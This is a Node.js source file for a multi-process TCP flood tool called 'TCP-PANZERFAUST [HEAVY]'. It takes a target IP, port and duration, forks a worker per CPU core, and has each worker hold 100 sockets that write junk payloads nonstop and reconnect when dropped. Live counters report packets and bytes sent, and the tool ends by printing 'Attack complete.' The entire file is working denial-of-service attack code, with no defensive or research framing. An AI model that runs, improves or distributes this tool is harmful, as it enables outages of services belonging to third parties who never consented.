const net = require('net');
const cluster = require('cluster');
const os = require('os');

const target = process.argv[2];
const port = parseInt(process.argv[3]) || 80;
const duration = parseInt(process.argv[4]);

if (!target || isNaN(duration)) {
  console.log('Usage: node tcp-panzerfaust-heavy-multi.js <target_ip> <port> <duration_seconds>');
  process.exit(1);
}

const endTime = Date.now() + duration * 1000;
const payloadSize = 1472;
const payload = Buffer.alloc(payloadSize);
const cpuCount = os.cpus().length;
const socketsPerWorker = 100;

// Format helpers
function formatNumber(n) {
  const units = ['', 'K', 'M', 'B', 'T'];
  let i = 0;
  while (n >= 1000 && i < units.length - 1) {
    n /= 1000;
    i++;
  }
  return `${n.toFixed(2)}${units[i]}`;
}

function formatBytes(bytes) {
  const units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
  let i = 0;
  while (bytes >= 1024 && i < units.length - 1) {
    bytes /= 1024;
    i++;
  }
  return `${bytes.toFixed(2)} ${units[i]}`;
}

if (cluster.isMaster) {
  let totalSent = 0;
  let totalBytes = 0;

  console.clear();
  console.log('TCP-PANZERFAUST [HEAVY]');
  console.log('--------------------------------------');
  console.log(`Target:                ${target}:${port}`);
  console.log(`Duration:              ${duration}s`);
  console.log(`Payload:               ${payloadSize} bytes`);
  console.log(`Cores:                 ${cpuCount}`);
  console.log(`Sockets/Core:          ${socketsPerWorker}`);
  console.log('Launching...\n');

  for (let i = 0; i < cpuCount; i++) cluster.fork();

  for (const id in cluster.workers) {
    cluster.workers[id].on('message', (msg) => {
      if (msg.type === 'stats') {
        totalSent += msg.sent;
        totalBytes += msg.bytes;
      }
    });
  }

  setInterval(() => {
    console.clear();
    console.log('TCP-PANZERFAUST [HEAVY]');
    console.log('--------------------------------------');
    console.log(`Total Packets Sent:    ${formatNumber(totalSent)}`);
    console.log(`Data Sent:             ${formatBytes(totalBytes)}`);
    console.log(`Target:                ${target}:${port}`);
    console.log(`Payload:               ${payloadSize} bytes`);
    console.log('--------------------------------------');
  }, 2000);

  setTimeout(() => {
    console.log('\nAttack complete.');
    for (const id in cluster.workers) cluster.workers[id].kill();
    process.exit(0);
  }, duration * 1000);

} else {
  let sent = 0;
  let bytes = 0;

  function connectAndFlood() {
    const socket = net.createConnection({ host: target, port: port }, () => {
      socket.setNoDelay(true);

      function sendLoop() {
        if (Date.now() > endTime) return socket.destroy();

        try {
          for (let i = 0; i < 25; i++) {
            socket.write(payload);
            sent++;
            bytes += payloadSize;
          }
        } catch (err) {
          // Ignore send errors
        }

        setImmediate(sendLoop);
      }

      sendLoop();
    });

    socket.on('error', () => setTimeout(connectAndFlood, 100));
    socket.on('close', () => {
      if (Date.now() < endTime) setTimeout(connectAndFlood, 100);
    });
  }

  for (let i = 0; i < socketsPerWorker; i++) {
    connectAndFlood();
  }

  setInterval(() => {
    process.send({ type: 'stats', sent, bytes });
    sent = 0;
    bytes = 0;
  }, 1000);
}
